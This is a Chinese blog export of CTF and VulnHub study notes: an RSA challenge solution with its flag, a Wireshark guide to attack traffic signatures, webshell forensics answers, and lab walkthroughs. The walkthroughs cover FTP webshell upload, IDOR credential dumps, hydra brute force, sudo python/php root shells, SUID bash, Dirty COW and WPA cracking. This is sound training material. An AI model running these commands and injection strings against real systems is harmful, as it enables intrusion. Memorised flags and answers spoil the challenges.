‘A’ 都对应 0 C（Ciphertext Number）含义：C 是密文字母对应的数字，取值范围：0-25 转换规则： A &#x3D; 0, B &#x3D; 1, C &#x3D; 2, …, Z &#x3D; 25 不区分大小写：’a’ 和 ‘A’ 都对应 0 K（Key Number）含义：密钥字母对应的数字，取值范围：0-25 转换规则： A &#x3D; 0, B &#x3D; 1, C &#x3D; 2, …, Z &#x3D; 25 同样不区分大小写 法二：在线解密网站1https://ctf.bugku.com/tools#:~:text=Bugku%20CTF%E5%9C%A8 二、现代密码1.RSA RSA基础参数 公钥：(n, e) 私钥：(n, d) 密文：c 明文：m 解密公式 核心解密公式： 1m = c^d mod n 其中： m &#x3D; 解密后的明文（整数形式） c &#x3D; 密文（整数形式） d &#x3D; 私钥指数 n &#x3D; 模数（两个大素数的乘积） 解密步骤详解 步骤1：将密文转换为整数 12345678910# 如果密文是字节形式c = int.from_bytes(ciphertext, &#x27;big&#x27;)# 如果密文是十六进制字符串c = int(ciphertext_hex, 16)# 如果密文是Base64编码import base64cipher_bytes = base64.b64decode(ciphertext_b64)c = int.from_bytes(cipher_bytes, &#x27;big&#x27;) 步骤2：执行模幂运算 12# 使用快速幂算法m = pow(c, d, n) 步骤3：将整数转换回明文 123456789# 转换为字节plaintext = m.to_bytes((m.bit_length() + 7) // 8, &#x27;big&#x27;)# 或者直接解码为字符串（如果原始是文本）try: plaintext = plaintext.decode(&#x27;utf-8&#x27;)except UnicodeDecodeError: # 处理非文本数据 pass [LitCTF 2023]家人们！谁懂啊，RSA签到都不会 (初级)123456789101112131415161718附件.pyfrom Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)e = 65537n = p*qc = pow(m,e,n)print(f&#x27;p = &#123;p&#125;&#x27;)print(f&#x27;q = &#123;q&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)&#x27;&#x27;&#x27;p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057&#x27;&#x27;&#x27; 12345678910111213141516解密脚本import libnum #导入名为libnum的模块,它提供了一系列函数来处理大整数、素数测试、离散对数、有限域运算等from Crypto.Util.number import long_to_bytese = 65537p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057# 根据p、q可以算出n和φ(n)n = p * qphi_n = (p-1)*(q-1)# 根据e和φ(n)可以算出dd = libnum.invmod(e, phi_n) #是一个调用 libnum 库中 invmod 函数的表达式。libnum 主要用于数论和代数计算，invmod 函数用于计算模逆元，#invmod(a, n) - 求a对于n的模逆,这里逆向加密过程中计算ψ(n)=(p-1)(q-1)，对ψ(n)保密,也就是对应根据ed=1modψ(n),求出d# 根据c、d、n可以解密出明文mm = pow(c, d, n)# 对应前面解密算法中M=D(C)=C^d(mod n)# 数字转字节序列print(long_to_bytes(m)) 123LitCTF&#123;it_is_easy_to_solve_question_when_you_know_p_and_q&#125;NSSCTF&#123;it_is_easy_to_solve_question_when_you_know_p_and_q&#125; 2.AES1https://www.toolhelper.cn/SymmetricEncryption/AES 3.SHA-256核心特征： 输出长度：固定256位（32字节） 输入长度：理论上无限（最大2^64-1位） 确定性：相同输入总是产生相同输出 单向性：从哈希值无法反推原始数据 抗碰撞性：很难找到两个不同的输入产生相同的哈希值","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://example.com/categories/Crypto/"}],"tags":[{"name":"凯撒密码","slug":"凯撒密码","permalink":"http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"},{"name":"维吉尼亚密码","slug":"维吉尼亚密码","permalink":"http://example.com/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/"},{"name":"RSA","slug":"RSA","permalink":"http://example.com/tags/RSA/"}]},{"title":"流量分析恶意攻击","slug":"流量恶意攻击","date":"2025-10-11T14:56:51.455Z","updated":"2025-10-25T07:55:13.743Z","comments":true,"path":"2025/10/11/流量恶意攻击/","permalink":"http://example.com/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/","excerpt":"","text":"场景概述你有一个网络流量文件（比如 .pcap 或 .pcapng），其中包含了一些攻击者IP的恶意活动。你的目标是： 识别出这些恶意操作的类型。 理解每种操作的流量特征。 确定并定位出攻击者的IP地址。 第一部分：常见的恶意操作及其流量特征以下是一些最常见的恶意操作，以及它们在流量数据中呈现出的特征。 1. 端口扫描与主机发现这是攻击的前期侦察阶段，目的是发现网络上存活的主机和开放的服务。 恶意操作： TCP SYN 扫描： 向目标的一系列端口发送TCP SYN包。 UDP 扫描： 向目标的UDP端口发送数据包。 ICMP 扫描： 发送ICMP Echo请求（Ping）来发现存活主机。 流量特征： 高频率、小范围： 在很短的时间内，从一个IP向另一个IP的多个不同端口发送大量连接请求。 没有完整连接： 对于TCP SYN扫描，你会看到大量SYN包，但很少有后续的SYN-ACK或ACK（这意味着连接没有建立起来）。 ICMP不可达响应： 对于UDP扫描，可能会看到来自目标的“ICMP Port Unreachable”响应，这表明端口是关闭的。 统计异常： 在流量统计中，该源IP的“连接数&#x2F;秒”或“数据包&#x2F;秒”会远高于正常用户。 2. 暴力破解攻击者尝试用大量的用户名和密码组合来登录服务，如SSH、RDP、FTP、Web表单等。 恶意操作： 对同一个服务进行大量的认证尝试。 流量特征： 固定的目标IP和端口： 流量集中在一个IP的一个特定服务端口上（如TCP&#x2F;22 for SSH, TCP&#x2F;3389 for RDP）。 重复的协议模式： 你会看到大量、快速的“登录请求 -&gt; 登录失败”的协议交互。 高失败率： 在流量内容中（如果未加密），你可以看到大量的HTTP 401 Unauthorized、SSH Authentication Failed等响应。 规律性： 请求之间的时间间隔可能很规律（如工具自动发送）。 3. 漏洞利用攻击者利用软件或协议中的漏洞来获得未授权的访问或执行代码。 恶意操作： 向目标服务发送精心构造的、异常的恶意数据包。 流量特征： 协议异常： 数据包违反协议规范，例如异常的TCP标志位组合、过大的数据包、畸形的HTTP请求头等。 Shellcode特征： 负载中可能包含可执行的机器代码（shellcode），在Wireshark中查看时会显示为一长串十六进制字符。 缓冲区溢出尝试： 在请求字段中填充超长字符串。 特定攻击载荷： 负载中可能包含已知漏洞的利用代码或命令（如 ../../../etc/passwd 路径遍历，或 union select SQL注入语句）。 4. 拒绝服务攻击目的是耗尽目标系统的资源（带宽、CPU、内存），使其无法提供正常服务。 恶意操作： 流量洪泛： 如ICMP Flood, UDP Flood, SYN Flood。 应用层DDoS： 如HTTP Flood。 流量特征： 极高的流量速率： 流量图上会出现一个明显的峰值。 来源分散： 对于分布式攻击，会有大量不同的IP向同一个目标IP发送流量。 协议单一： 在SYN Flood中，你会看到海量的TCP SYN包；在UDP Flood中，则是海量的UDP包。 无业务逻辑： 发送的流量是随机的或无意义的，不像正常用户那样有完整的会话交互。 5. 命令与控制攻击成功后，受害主机（僵尸）会与攻击者的C2服务器建立连接，接受指令。 恶意操作： 受感染的内网主机与一个外部IP进行周期性、隐蔽的通信。 流量特征： 周期性心跳： 受感染主机会以固定的时间间隔（如每60秒）向C2服务器发送一个小数据包（如TCP、HTTP、DNS请求），表示“我还活着”。 非标准端口： C2通信经常使用常见的端口（如TCP&#x2F;80, TCP&#x2F;443）来伪装成Web流量，但协议可能不是标准的HTTP&#x2F;HTTPS。 长连接： 连接可能会保持很长时间，但数据传输量很小。 DNS隧道： 利用DNS查询和响应记录来传输数据，你会看到大量异常的、长字符串的DNS查询请求（例如 long-encrypted-string.malicious.com）。 6. 数据外泄攻击者将窃取的数据从内部网络传输到外部。 恶意操作： 将大量数据从目标网络内部发送到一个外部IP。 流量特征： 出站流量激增： 一个内部IP向某个外部IP发起了大量的出站连接，且数据传输量异常大（尤其是上传流量）。 协议： 可能使用FTP、HTTP POST、或加密的HTTPS&#x2F;TCP连接。 数据模式： 如果未加密，你可能会在数据包中看到文件头信息（如 PK 表示ZIP文件，%PDF 表示PDF文档）或数据库转储的明文。 第二部分：如何在流量中分析并确定攻击者IP现在，我们使用工具（如 Wireshark）来执行分析。 步骤一：宏观统计，寻找异常 打开流量文件，首先查看 Statistics -&gt; Conversations。 切换到IPv4&#x2F;IPv6标签页。这里会列出所有通信的IP对以及数据包数量、字节数。 排序： 按数据包数量排序： 排名前列的对话中，如果有一个IP与大量其他IP通信（可能是扫描），或者两个IP之间有异常多的数据包（可能是暴力破解或数据外泄），这些就是可疑对象。 按字节数排序： 找出传输数据量最大的对话。如果一个内部IP向外部IP发送了远超寻常的数据量，极有可能是数据外泄。 步骤二：使用过滤器精准定位Wireshark的显示过滤器是你的核心武器。 寻找扫描器： ip.src == 192.168.1.100 &amp;&amp; tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0 这能过滤出IP 192.168.1.100 发出的所有SYN扫描包。如果这个列表很长，且目标端口分散，那它就是个扫描器。 寻找暴力破解： ip.src == 192.168.1.100 &amp;&amp; tcp.port == 22 查看该IP对SSH端口的访问频率。再追踪一个TCP流，看看里面是不是充满了登录失败的报文。 寻找C2心跳： frame.time_delta &gt; 59 &amp;&amp; frame.time_delta &lt; 61 这个过滤器可以尝试找出时间间隔大约为60秒的数据包，有助于发现心跳流量。需要结合对话列表来判断。 寻找特定攻击字符串： http.request.uri contains “../../../” tcp contains “union select” 这些过滤器可以直接在流量中搜索已知的攻击特征。 步骤三：深入流量，验证判断 右键点击可疑的数据包 -&gt; Follow -&gt; TCP Stream&#x2F;UDP Stream&#x2F;HTTP Stream。 这会将整个会话的内容重组并显示出来。在这里你可以清晰地看到： 完整的HTTP请求和响应。 SSH或FTP的登录过程。 执行的命令。 传输的文件内容。 这是最终确认恶意操作性质的最关键一步。 步骤四：综合判断攻击者IP通过以上分析，你可以得出结论： 攻击者IP通常是流量的源IP。但在DDoS或反射攻击中，源IP可能是被伪造或利用的傀儡机。 核心逻辑是：寻找行为异常的IP。 谁在频繁地扫描端口？ -&gt; 攻击者IP 谁在不停地尝试登录？ -&gt; 攻击者IP 谁在接收大量外泄数据？ -&gt; 攻击者IP（C2服务器） 谁在发送大量攻击载荷？ -&gt; 攻击者IP 哪个外部IP在与我的内网主机进行周期性通信？ -&gt; 攻击者IP（C2服务器） 总结与工作流 统计先行： 用 Conversations 和 Protocol Hierarchy 宏观把握，找到“最忙”和“最异常”的IP。 过滤聚焦： 使用Wireshark过滤器，针对特定协议、标志位、字符串进行精准搜索。 流分析确认： 对任何可疑的会话，使用 Follow Stream 功能查看完整内容，这是取证的黄金标准。 交叉验证： 一个IP可能进行多种恶意操作（例如，先扫描，发现22端口开放后，接着进行SSH暴力破解）。将这些点串联起来，能更完整地描绘出攻击链。 通过这个系统性的方法，你就可以从一个原始的流量文件中，有效地挖掘出攻击者的IP地址和他们所进行的全部恶意操作。 常见的恶意操作及其流量特征（详解）攻击活动在流量中会留下独特的“指纹”，我们可以从协议行为、数据包速率、负载内容、会话模式等多个维度进行识别。 1. 侦察阶段：端口扫描与主机发现这是攻击的“敲门”阶段，目标是绘制网络地图。 主要技术： TCP SYN 扫描： 发送TCP SYN包到目标端口。如果收到SYN-ACK，则端口开放；如果收到RST，则端口关闭。 TCP Connect 扫描： 完成完整的TCP三次握手。 UDP 扫描： 发送UDP包到目标端口。如果收到ICMP端口不可达，则端口关闭；否则可能开放。 ICMP 扫描： 发送ICMP Echo请求，根据是否有Reply判断主机是否在线。 核心流量特征： 来源集中，目标分散： 一个源IP在极短时间内，向一个目标IP的多个端口，或向一个网段的多个IP发送探测包。 高包量，低交互： 在Statistics -&gt; Conversations中，该源IP的数据包数量和连接数会排名靠前，但数据传输的字节数通常很小，因为只是探测。 协议标志异常： SYN扫描： 流量中充满 [SYN] 和 [RST-ACK] 的响应，几乎没有成功的 [SYN-ACK] -&gt; [ACK] 完整握手。 僵尸扫描： 会出现来源IP伪造的、带有异常标志位组合的数据包。 时序特征： 数据包发送速率极快，间隔均匀，是工具自动化的明显标志。 2. 入侵阶段：暴力破解试图用“穷举法”猜出合法凭证，从而获得访问权限。 主要目标： SSH (22), RDP (3389), FTP (21), Telnet (23), Web登录页面 (80&#x2F;443), 数据库 (3306, 1433) 等。 核心流量特征： 目标固定： 流量持续指向特定目标IP的特定服务端口。 重复的认证模式： 在追踪TCP流时，你会看到大量、快速重复的“认证请求-失败响应”循环。 SSH： 连续的 SSH: Client: Authentication (failed) 报文。 HTTP： 大量的 POST /login.php 请求，伴随 HTTP 401 Unauthorized 或 200 OK with login failed page 响应。 FTP： 连续的 USER 和 PASS 命令，以及 530 Login incorrect 响应。 高频率： 认证尝试的频率远超人类手动操作，每秒可能发生数次甚至数十次。 用户名字典： 在流量中可以看到工具尝试了大量的不同用户名和密码。 3. 入侵阶段：漏洞利用利用软件、系统或协议中的安全缺陷，来获取系统控制权。 主要形式： 缓冲区溢出、SQL注入、跨站脚本、远程代码执行、反序列化漏洞等。 核心流量特征： 载荷内容异常： 缓冲区溢出： 在请求的某个字段中出现超长字符串，意图填满并溢出内存缓冲区。 SQL注入： 在HTTP请求的URI或POST参数中包含 &#39;、union select、or 1=1、sleep( 等SQL关键字和语法。 路径遍历： 包含大量的 ../ 序列，试图访问系统敏感文件（如 ../../../etc/passwd）。 命令注入： 包含系统命令，如 ; cat /etc/passwd、| whoami 等。 Shellcode： 负载中包含一串可执行的机器码（在十六进制视图里像是一长串90 90 90 E8 CF...的序列）。 协议规约违反： 发送不符合RFC标准的畸形数据包，例如异常的HTTP方法、畸形的TCP序列号、不合法的TLS握手等，旨在触发目标系统的解析错误。 4. 破坏阶段：拒绝服务攻击旨在耗尽目标资源，使其无法提供正常服务。 主要类型： 流量型DDoS： 用巨大的流量堵塞带宽（如UDP Flood, ICMP Flood）。 协议型DDoS： 利用协议特性消耗服务器资源（如SYN Flood）。 应用层DDoS： 模拟大量“合法”请求消耗应用性能（如HTTP Flood）。 核心流量特征： 流量洪峰： 在 Statistics -&gt; I/O Graph 中，会看到一个突然的、持续的巨大流量峰值。 来源特征： 分布式攻击： 海量不同的源IP向同一个目标IP发送数据，在Conversations中，目标IP的包量和字节数独占鳌头。 反射&#x2F;放大攻击： 源IP是伪造的，流量主要由响应包构成（如大量的DNS响应、NTP响应）。 协议单一且无状态： SYN Flood： 海量的 [SYN] 包，但没有后续握手。 UDP Flood： 海量的UDP包，内容通常随机或无意义。 HTTP Flood： 海量的HTTP GET&#x2F;POST请求，但来自大量不同的IP（僵尸网络），行为模拟正常用户，难以单从协议上区分。 5. 持久化阶段：命令与控制攻击者建立对受害主机的远程控制通道。 主要通信方式： HTTP&#x2F;HTTPS, DNS, IRC, 自定义TCP&#x2F;UDP协议。 核心流量特征： 周期性心跳： 最典型的特征。受感染主机会以固定的时间间隔（如每30秒、60秒）向C2服务器发送一个小数据包（如一个HTTP GET请求，一个特定的DNS查询）。使用 frame.time_delta 过滤器可以辅助发现。 长连接，小流量： 与C2服务器的连接可能持续数小时，但期间数据传输量很小，只是在等待命令。 非标准端口使用： 在80或443端口上运行非HTTP&#x2F;HTTPS的协议，或者使用不常见的高端口号。 DNS隧道： 异常频繁的DNS查询，尤其是对TXT记录或AAAA记录的查询。 查询的域名通常非常长且随机（如 kjasdhfkjasdhf.malicious.com），用于封装外泄的数据或指令。 查询响应中包含编码后的数据。 6. 行动完成阶段：数据外泄将窃取的敏感数据从内网传输到攻击者控制的服务器。 主要方式： FTP, HTTP POST, HTTPS, SCP, 或通过C2通道分块传输。 核心流量特征： 出向流量激增： 最核心的特征。一个内网IP会向某个外部IP发起大量的、持续的数据流出。在Conversations中按字节数排序，这个会话会非常突出。 数据量不对称： 会话中，从内网到外网的流量（上传）远大于从外网到内网的流量（下载）。 载荷特征： 如果未加密，在TCP流中可能直接看到被窃文件的内容，如数据库表、文档内容、配置文件等。 即使加密，也能看到文件传输的迹象，例如在FTP传输中看到 STOR secret.docx 命令，或在HTTP中看到大量连续的 POST 请求携带加密数据。 总结表： 恶意操作 关键流量特征 端口扫描 一源对多目标&#x2F;多端口，高频SYN包，低成功率握手 暴力破解 固定目标端口，高频认证请求，大量失败响应 漏洞利用 协议或载荷异常，包含超长字符串、SQL语句、系统命令 拒绝服务 流量峰值，海量源IP或SYN包，目标单一，协议单一 命令与控制 周期性心跳包，长连接小流量，非标准端口，异常DNS查询 数据外泄 内网到外网的持续大流量，数据量不对称，可见文件内容&#x2F;命令 掌握这些特征后，你在分析流量时就不再是漫无目的地查看，而是带着“症状清单”去进行“诊断”，从而能够高效、准确地定位出恶意活动和攻击者IP。 web漏洞使用方法： 扫描漏洞： bash 1python web_security_fix.py --scan 生成安全头配置： bash 1python web_security_fix.py --generate-headers --output security_headers.json 生成数据库安全配置： bash 1python web_security_fix.py --generate-db-config mysql --output db_security.py 生成文件上传验证： bash 1python web_security_fix.py --generate-upload-validation --output file_upload.py 主要防护功能： SQL注入防护 - 参数化查询和输入验证 XSS防护 - 输入清理和输出编码 CSRF防护 - 令牌验证 会话安全 - 安全cookie配置 文件上传安全 - 类型和大小验证 安全配置 - HTTP安全头 密码安全 - 强哈希算法 输入验证 - 严格的数据验证规则 这个脚本提供了全面的Web应用程序安全防护，可以有效防止大多数常见的Web漏洞攻击。","categories":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://example.com/categories/NSSCTF/"}],"tags":[]},{"title":"流量分析","slug":"流量分析","date":"2025-10-10T08:15:21.450Z","updated":"2025-10-25T07:55:26.767Z","comments":true,"path":"2025/10/10/流量分析/","permalink":"http://example.com/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"ctrl+F jwt令牌 1https://www.json.cn/jwt 查找文件的话先过滤http然后看ctl+F找root，再这个这条流量附近查看其他的流量找&#x2F;exec，查看文件一般在&#x2F;tmp目录下 黑客在服务器上修改了一个配置文件，文件的绝对路径为**&#x2F;etc&#x2F;pam.d&#x2F;common-auth** webshell单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客修改了一个日志文件，文件的绝对路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;data…..。 webshell网站下的绝对路径是在&#x2F;var&#x2F;www&#x2F;html&#x2F;作为根目录的，所以要写绝对路径的话就要加&#x2F;var&#x2F;www&#x2F;html&#x2F;，如果是其他的系统文件的配置文件就不用加这个根目录 最常见的日志文件后缀 .log 这是最通用、最常见的日志文件后缀。** 无论是系统、应用程序还是自定义服务，都倾向于使用这个后缀。 示例: system.log&#96; application.log&#96; security.log&#96; my_app.log&#96; .txt 因为日志本质上就是纯文本文件，所以使用 .txt 后缀也非常普遍，尤其是在一些简单的应用程序或脚本中。 示例: log.txt error.txt 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客上传的代理工具客户端名字是frpc 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客代理工具的回连服务端IP是192.168.239.123 然后把key16进制转换成字符串 日志分析单位某应用程序被攻击，请分析日志，进行作答：网络存在源码泄漏，源码文件名是www.zip 源码被泄露，说明就是被攻击者在网站上成功访问下载，状态码是200 单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名为sess_car 单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客使用的是SplFileObject类读取了秘密文件 看一下发现很多404，可以知道是对目录进行了扫描。记事本打开然后搜索200，发现状态码为200的并不多，观察可以发现最后一条流量中，是使用了php的原生类SplFileObject读取了文件 某应用程序被攻击，请分析日志后作答：黑客查看的秘密文件的绝对路径是&#x2F;Th4s_IS_VERY_Import_Fi1e","categories":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://example.com/categories/NSSCTF/"}],"tags":[]},{"title":"hackablell","slug":"hackableII","date":"2025-10-09T08:59:03.832Z","updated":"2025-10-25T07:53:59.336Z","comments":true,"path":"2025/10/09/hackableII/","permalink":"http://example.com/2025/10/09/hackableII/","excerpt":"","text":"一、信息收集1.扫描靶机IP：192.168.88.34 2.靶机开放的端口：21(ftp)，22(ssh)，80(http) 3.扫描目录 1http://192.168.88.34/files/ 其余就没啥有用的信息了 二、web程序探索1.ftp1.1 ftp直接访问 1.2 FileZilla工具 由ftp的目录文件可以看出，这个ftp的根目录是http://192.168.88.34/files/，ftp是匿名登录的，没有设置账号密码，可以上传下载文件，所以我们可以直接上传web shell的文件，攻击机监听反弹shell即可 或者上传一个木马文件，用蚁剑连接 得到一个比较低的权限www-data之后得到一个shrek用户跟一个MD5加密的密码：onion 1cf4c2232354952690368f1b3dfdfb24d 如果是反弹shell就可以直接用su切换shrek用户 但是用蚁剑连接的话不能直接在蚁剑的虚拟终端用su切换到shrek用户，可以用ssh连接 三、www-data-&gt;rootpython3.5sudo root无密码使用python3.5 直接用sudo python3.5指令执行os系统shell的命令提权到root即可 1sudo python3.5 -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;","categories":[{"name":"vulnhub","slug":"vulnhub","permalink":"http://example.com/categories/vulnhub/"}],"tags":[{"name":"ftp","slug":"ftp","permalink":"http://example.com/tags/ftp/"},{"name":"python3.5","slug":"python3-5","permalink":"http://example.com/tags/python3-5/"}]},{"title":"Me-and-My-Girlfriend-1","slug":"Me-and-My-Girlfriend-1","date":"2025-10-07T10:36:42.456Z","updated":"2025-10-17T12:58:19.277Z","comments":true,"path":"2025/10/07/Me-and-My-Girlfriend-1/","permalink":"http://example.com/2025/10/07/Me-and-My-Girlfriend-1/","excerpt":"","text":"靶机地址：Me and My Girlfriend: 1 ~ VulnHub 一、信息收集根据上面靶机描述中可以知道有alice跟bob 1.扫描靶机IP：192.168.88.32 2.靶机开放的端口22(ssh)跟80(http) 3.扫描目录 123http://192.168.88.32/robots.txthttp://192.168.88.32/heyhoo.txt 信息收集至今也没发现有什么太大价值的东西，所以去web层面去看一下 二、web程序漏洞1.x-forwarded-for的ip欺骗查看80端口页面源代码，发现让我们使用x-forwarded-for并且这个页面只能在本地才能访问，所以我们要利用x-forwarded-for的IP欺骗去访问这个页面 这时候利用x-forwarded-for，就要修改请求头的内容，而修改请求头的内容就需要浏览器添加相应插件，我用的是火狐浏览器的Modify Header Value 插件配置完成之后就直接浏览器访问对应的URL，在开发者工具里面就可以看到新增的请求头内容就会出现 这时候IP欺骗成功，访问进到对应的页面 2.web页面探索攻击这里可以随便注册一个用户，然后登录即可 也可以在登录页面什么都不填也可以登录进去 登录进来之后，继续探索 在开发工具里面直接删掉disabled&#x3D;”disabled”就可以使change的按钮生效 这里的admin是之前我在注册的时候添加的，在添加之后访问这个页面的user_id的参数值是15，在登录页面什么都不填直接登录的user_id的参数值是12，所以后面发现尝试修改user_id后面的参数值是直接可以查看到其他的用户名跟密码的 如果是用sqlmap工具自动注入的话，就要带cookie的值，因为这里有相关的登录验证所以这里就要cookie的值 查找cookie值的方法在开发者工具里面的控制台输入document.cookie，就会直接给出cookie的值 12man sqlmap #查看sqlmap的相关的指令/cookie #查找cookie相关的指令 使用sqlmap工具自动注入，其结果显示没有注入 所以这里只能一个一个的手动注入，直接修改URL的user_id后面的参数值即可 其实这里后面的value值就是密码 把所有的用户名写入到一个user.txt文件里面，在上面靶机描述中可以知道还有bob用户也一并加入到这个文件里面，再把注入查找到的密码写一并写入到一个pass.txt文件里面，以便于后面用hydra工具爆破ssh的用户名跟密码 成功爆破ssh的用户名跟密码，这里其实可以猜测到用户名就是alice，因为在靶机描述中反复提到alice跟bob，而在web页面手工注入到的用户名就只有alice的密码，所以直接猜测到ssh的用户名跟密码就是alice的 12用户名：alice密码：4lic3 三、用alice用户ssh登录 登录之后就会在alice的家目录里面看到**.my_secret**的目录，进去cat一下，找到第一个flag1跟my_notes.txt 1Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125; 四、提取：alice-&gt;root根据提示，第二个flag在root下面，所以接下来就是提权到root sudo -l可以看到**&#x2F;usr&#x2F;bin&#x2F;php**是不需要root密码就可以直接使用的 执行的提权指令 法一：直接执行系统命令 12CMD=&quot;/bin/sh&quot;sudo php -r &quot;system(&#x27;$CMD&#x27;);&quot; 1sudo php -r &quot;system(&#x27;/bin/bash&#x27;);&quot; #简化的指令,注意这里最好使用bash，因为使用sh的话虽然执行之后是root，但是不会直接显示是否是root，需要id才会显示 法二：直接写一个bash的系统命令的php语句，再用php去执行这个php文件，就可以直接提权到root了，注意这里执行php文件的时候需要添加sudo使用root用户去执行这个php文件，如果不添加sudo的话就会直接执行php 1.php的指令这个只是在当前用户alice执行这个php文件并不会触发无密码root使用的php，自然也就不会提权到root 法三：写入suid shell 12345678echo &#x27;&lt;?php system(&quot;chmod +s /bin/bash&quot;); ?&gt;&#x27; | sudo php # 创建PHP反弹shell，通过PHP给/bin/bash添加SUID权限，但它不会工作ls -al /bin/bash #查看suid权限是否设置成功/bin/bash -p # 然后执行特权shell#执行 /bin/bash -p 是启动一个具有特权模式（privileged mode） 的bash shell#-p 参数的作用：启动bash时不重置有效用户ID（EUID）保留当前的特权状态不处理 $ENV 和 $BASH_ENV 文件 1Flag 2: gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125; 注意：这里的-p参数是必须要添加的，不然的话是没有root权限的","categories":[{"name":"vulnhub","slug":"vulnhub","permalink":"http://example.com/categories/vulnhub/"}],"tags":[{"name":"x-forwarded-for的ip欺骗","slug":"x-forwarded-for的ip欺骗","permalink":"http://example.com/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/"},{"name":"php提权root","slug":"php提权root","permalink":"http://example.com/tags/php%E6%8F%90%E6%9D%83root/"}]},{"title":"Lampiao","slug":"Lampiao","date":"2025-09-27T06:20:50.030Z","updated":"2025-10-17T12:55:52.225Z","comments":true,"path":"2025/09/27/Lampiao/","permalink":"http://example.com/2025/09/27/Lampiao/","excerpt":"","text":"一、信息收集1.扫描IP 123456┌──(root㉿kali)-[~]└─# arp-scan -l Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)...............192.168.88.30 08:00:27:66:5e:2e PCS Systemtechnik GmbH............... 靶机IP：192.168.88.30 2.扫描端口服务 12345678910111213┌──(root㉿kali)-[~]└─# nmap 192.168.88.30 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 03:17 EDTNmap scan report for 192.168.88.30Host is up (0.0021s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http1898/tcp open cymtec-portMAC Address: 08:00:27:66:5E:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds 开放22,80和1898 80端口没有啥 1898端口就直接有drupal的cms,再扫描一下1898的目录，有一个robots.txt文件，里面也没有什么关键的信息 二、drupal的漏洞利用法一：msfconsle去msfconsle,search一下drupal的漏洞利用 注意rport的端口要改成1898 法二：工具用工具专门查找drupal的漏洞 三、提权到root(dirtycow)12uname -a #查看一下内核版本Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux #存在dirtycow提权漏洞 12345678 发行版 内核版Centos7/RHEL7 3.10.0-327.36.3.el7Cetnos6/RHEL6 2.6.32-642.6.2.el6Ubuntu 16.10 4.8.0-26.28Ubuntu 16.04 4.4.0-45.66Ubuntu 14.04 3.13.0-100.147Debian 8 3.16.36-1+deb8u2Debian 7 3.2.82-1 法一：www-data-&gt;root在www-data用户下直接利用dirtycow提权到root 法二：www-data-&gt;tiago-&gt;root在家目录下面看到有tiago用户，随后就去找tiago的密码 找到drupal数据库的用户名跟密码Virgulino，就跟上面的tiago用户联系起来，ssh测试连接一下，成功登录 12用户：tiago密码：Virgulino 在tiago用户下使用dirtycow漏洞提权到root","categories":[{"name":"vulnhub","slug":"vulnhub","permalink":"http://example.com/categories/vulnhub/"}],"tags":[{"name":"dirtycow","slug":"dirtycow","permalink":"http://example.com/tags/dirtycow/"},{"name":"drupal","slug":"drupal","permalink":"http://example.com/tags/drupal/"}]},{"title":"Victim01_042220","slug":"Victim01_042220","date":"2025-09-23T07:26:43.329Z","updated":"2025-10-17T13:01:30.647Z","comments":true,"path":"2025/09/23/Victim01_042220/","permalink":"http://example.com/2025/09/23/Victim01_042220/","excerpt":"","text":"一、信息收集1.扫描靶机IP为192.168.88.28 2.扫描靶机开放的端口服务 当前开放的端口只有8999跟9000可以打开看到有东西 9000没啥有用的信息 二、攻破web8999是一个WordPress WPA-01.cap流量包常规扫一下目录，同时也没有找到有啥用用的信息，所以就用wireshark查看一下WPA-01.cap流量包(抓包工具的包—握手包) 掉线值需要填一个Mac地址，路由器跟你dath掉之后就相当于就是断开连接了，需要重新连接，重新连接就会有一个抓包的过程，把连接过程抓的包抓到就可以找到一个哈希 DLink是一个路由器的包，SSID是无线网络(Wi-Fi)的名称，所以dlink就是路由器的无线网络名称（很可能是一台 D-Link 品牌的路由器） 破解这个流量包的密码法一：aircrack-ng用自带的套件aircrack-ng 1aircrack-ng -w mmzd/rockyou.txt /home/kali/Desktop/WPA-01.cap 123密码：p4ssword从上面的SSID可以猜测dlink是192.168.88.28的一个系统用户名 法二： 